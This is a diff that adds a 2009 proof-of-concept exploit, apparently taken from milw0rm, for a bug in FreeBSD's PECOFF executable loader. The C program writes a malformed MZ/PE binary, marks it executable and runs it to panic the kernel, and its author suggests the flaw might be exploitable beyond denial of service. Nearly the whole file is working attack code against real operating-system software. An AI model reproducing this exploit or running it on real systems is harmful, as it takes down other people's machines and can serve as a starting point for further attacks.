@@ -1,0 +1,41 @@
+/* pecoff_panic.c
+ *
+ * by Shaun Colley, 20 July 2009
+ *
+ * this code will panic the freebsd kernel due to a bug in the PECOFF executable loader
+ * code ('options PECOFF_SUPPORT' in kernel config or `kldload pecoff`)
+ *
+ * panic(9) is in vm_fault due to a page fault.  the panic seems to be caused in
+ * generic_bcopy...probably hitting a guard page..maybe exploitable(??) but this is just
+ * a DoS at the moment :)  (ugly code btw)
+ *
+ * tested on freebsd 7.2-RELEASE
+ *
+ * - shaun
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+int main() {
+int i, fd;
+system("rm -rf evilprog.exe; touch evilprog.exe");
+fd = open("evilprog.exe", O_WRONLY);
+char buf[0x3a+2+0x04+4000];
+buf[0] = 'M';
+buf[1] = 'Z';  /* magic */
+for(i = 2; i<0x3c; i++) buf[i] = 'a';
+buf[0x3c] = 0xee;
+buf[0x3d] = 0xee;
+buf[0x3e] = 0xee;
+buf[0x3f] = 0xee;
+for(i = 0x40; i<(0x40+4000); i++) buf[i] = 0x61;
+write(fd, buf, 0x3a+2+0x04+4000);
+close(fd);
+system("chmod 700 evilprog.exe");
+system("./evilprog.exe");  /* run the dodgy PECOFF binary */
+}
+
+// milw0rm.com [2009-07-20]
